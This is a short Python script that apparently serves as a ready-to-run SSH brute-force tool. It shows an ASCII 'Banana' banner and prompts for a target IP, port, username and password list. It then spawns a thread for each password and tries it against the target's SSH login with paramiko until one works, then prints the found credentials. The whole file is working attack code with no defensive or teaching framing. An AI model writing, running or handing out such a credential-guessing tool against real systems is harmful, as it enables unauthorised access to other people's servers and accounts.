import os
import paramiko
import threading

YELLOW = "\033[93m"
RESET = "\033[0m"

os.system("clear")

print(f"""{YELLOW}
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|
{RESET}
""")

target = input("🌐 Target IP address: ").strip()
port = input("🔌 SSH Port (default 22): ").strip()
port = int(port) if port else 22
username = input("👤 SSH Username: ").strip()

choice = input("📂 Use ready-made 'passlist.txt'? (y/n): ").strip().lower()
if choice == "y":
    path = "passlist.txt"
else:
    path = input("📁 Enter your password file path (e.g. ~/mylist.txt): ").strip()
path = os.path.expanduser(path)

if not os.path.isfile(path):
    print(f"❌ File not found: {path}")
    exit()

with open(path, "r", encoding="utf-8", errors="ignore") as f:
    passwords = f.read().splitlines()

print(f"\n🚀 Starting SSH brute-force on {target}:{port} as '{username}' with {len(passwords)} passwords...\n")
print("⚠️  Output hidden for speed. Please wait...\n")

found = threading.Event()

def try_ssh(password):
    if found.is_set():
        return
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, port=port, username=username, password=password, timeout=3)
        found.set()
        print(f"\n✅ SUCCESS: Username: '{username}' | Password: '{password}'")
        ssh.close()
    except:
        pass

threads = []
for pw in passwords:
    if found.is_set():
        break
    t = threading.Thread(target=try_ssh, args=(pw,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

if not found.is_set():
    print("\n❌ No valid password found.")
